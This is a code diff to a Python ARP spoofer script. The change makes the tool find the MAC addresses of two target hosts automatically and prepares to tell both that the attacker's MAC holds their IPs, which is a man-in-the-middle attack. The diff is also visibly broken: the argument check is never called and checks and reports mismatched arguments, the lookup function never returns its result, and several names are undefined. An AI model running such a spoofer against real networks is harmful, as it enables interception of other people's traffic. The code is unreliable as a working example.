@@ -5,49 +5,80 @@
 import time, os, sys
 from framebuilder import defs, eth, ipv4, tcp, tools
 
-if len(sys.argv) < 6:
-    print('Missing arguments')
-    print(f'Usage: {sys.argv[0]} interface left_ip left_mac right_ip right_mac')
-    sys.exit(1)
 
-if not tools.is_valid_ipv4_address(sys.argv[2]):
-    print(f'Invalid IP address: {sys.argv[2]}')
-    print(f'Usage: {sys.argv[0]} interface left_ip left_mac right_ip right_mac')
-    sys.exit(1)
+def print_err(msg):
+    arg_str = 'interface left_ip right_ip'
+    print('Error:', msg)
+    print(f'Usage: {sys.argv[0]} {arg_str}')
 
-if not tools.is_valid_ipv4_address(sys.argv[4]):
-    print(f'Invalid IP address: {sys.argv[4]}')
-    print(f'Usage: {sys.argv[0]} interface left_ip left_mac right_ip right_mac')
-    sys.exit(1)
 
-if not tools.is_valid_mac_address(sys.argv[3]):
-    print(f'Invalid MAC address: {sys.argv[3]}')
-    print(f'Usage: {sys.argv[0]} interface left_ip left_mac right_ip right_mac')
-    sys.exit(1)
+def check_args():
+    if len(sys.argv) < 4:
+        print_err('Missing arguments')
+        sys.exit(1)
+    if not tools.is_valid_ipv4_address(sys.argv[2]):
+        print_err(f'Invalid IP address: {sys.argv[2]}')
+        sys.exit(1)
+    if not tools.is_valid_ipv4_address(sys.argv[3]):
+        print_err(f'Invalid IP address: {sys.argv[4]}')
+        sys.exit(1)
 
-if not tools.is_valid_mac_address(sys.argv[5]):
-    print(f'Invalid MAC address: {sys.argv[5]}')
-    print(f'Usage: {sys.argv[0]} interface left_ip left_mac right_ip right_mac')
-    sys.exit(1)
+
+def get_mac_addr(ip_addr, if_name):
+    mac_addr = None
+    if_mac = tools.get_mac_addr(if_name)
+    if_ip = tools.get_if_ipv4_addr(if_name)
+    gw = tools.get_route_gateway(ip_addr)
+    if gw is not None:
+        ip_addr = gw
+    if mac_addr is None:
+        arp_sock = tools.create_socket(if_name)
+        max_try = 5
+        for num_try in range(max_try):
+            try:
+                mac_addr = tools.get_mac_for_dst_ip(ip_addr)
+                if mac_addr is None:
+                    raise FailedMACQueryException(f'IP {packet.dst_addr}')
+            except errors.FailedMACQueryException as e:
+                # set an invalid ARP cache entry and try to update it
+                tools.set_neigh(if_name, ip_addr)
+                if num_try < max_try - 1:
+                    arp_data = {
+                            'operation': 1,
+                            'src_addr': if_mac,
+                            'dst_addr': 'ff:ff:ff:ff:ff:ff',
+                            'snd_hw_addr': if_mac,
+                            'snd_ip_addr': if_ip,
+                            'tgt_hw_addr': '00:00:00:00:00:00',
+                            'tgt_ip_addr': ip_addr
+                            }
+                    arp_msg = ArpMessage(arp_data)
+                    arp_msg.send(arp_sock)
+                    sleep(0.2)
+                else:
+                    print(str(e))
+                    sys.exit(1) 
+
 
 if_name = sys.argv[1]
-os.system(f'sysctl -w net.ipv4.conf.{if_name}.forwarding=0 &>/dev/null')
+os.system(f'sysctl -w net.ipv4.conf.{if_name}.forwarding=0')
 
 my_ip = tools.get_if_ipv4_addr(if_name)
 if my_ip is None:
-    print(f'Could not find IP address of interface {sys.argv[1]}')
-    sys.exit(1)
+    print_err(f'Could not find IP address of interface {sys.argv[1]}')
 my_mac = tools.get_mac_addr(if_name)
 
 interval = 10**9
 left_ip = sys.argv[2]
-left_mac = sys.argv[3]
+left_mac = get_mac_addr(left_ip, if_name)
 right_ip = sys.argv[4]
-right_mac = sys.argv[5]
+right_mac = get_mac_addr(right_ip, if_name)
 
 tools.print_rgb('--- ARP spoofer ---',
         rgb=(200, 200, 200), bold=True)
-tools.print_rgb(f'pretend {left_ip} and {right_ip} to be at {my_mac}',
+tools.print_rgb(f'{left_ip}@{left_mac} --> {my_mac}',
+        rgb=(200, 0, 0), bold=True)
+tools.print_rgb(f'{right_ip}@{right_mac} --> {my_mac}',
         rgb=(200, 0, 0), bold=True)
 
 arp_data_left = {'operation': 2,
